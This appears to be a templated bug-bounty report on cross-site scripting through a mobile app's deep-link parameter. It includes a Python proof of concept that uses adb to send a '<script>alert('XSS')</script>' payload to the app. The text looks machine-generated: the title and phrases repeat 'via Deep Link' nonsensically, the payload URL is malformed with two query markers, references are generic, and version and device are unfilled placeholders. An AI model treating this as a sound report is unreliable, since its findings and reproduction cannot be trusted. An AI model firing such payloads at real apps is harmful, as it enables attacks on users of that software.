# XSS via Deep Link via Deep Link Parameter

## Summary

The application's deep link handler does not properly sanitize the 'param' parameter, allowing XSS via Deep Link attacks.

## Severity

**MEDIUM** (CVSS: 5.5)

## Steps To Reproduce

1. Install the vulnerable application
2. Run the PoC script or ADB command
3. Observe XSS via Deep Link execution

## Impact

An attacker can craft a malicious deep link to execute XSS via Deep Link in the context of the application.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept for XSS via Deep Link via Deep Link
"""
import subprocess

def exploit():
    deep_link = "grabconnect2://profile?user_id=123?param=<script>alert('XSS')</script>"
    
    # Launch app with malicious deep link
    cmd = ['adb', 'shell', 'am', 'start', '-a', 
           'android.intent.action.VIEW', '-d', deep_link]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Exploit sent successfully")
        print(f"[+] Deep link: {deep_link}")
    else:
        print(f"[-] Failed: {result.stderr}")

if __name__ == "__main__":
    exploit()

```

## Remediation

Sanitize and validate all deep link parameters before processing. Implement input validation and output encoding.

## Supporting Material/References

- OWASP Mobile Security Testing Guide
- CWE Reference

## System Information

- Platform: Android/iOS
- App Version: [VERSION]
- Device: [DEVICE]
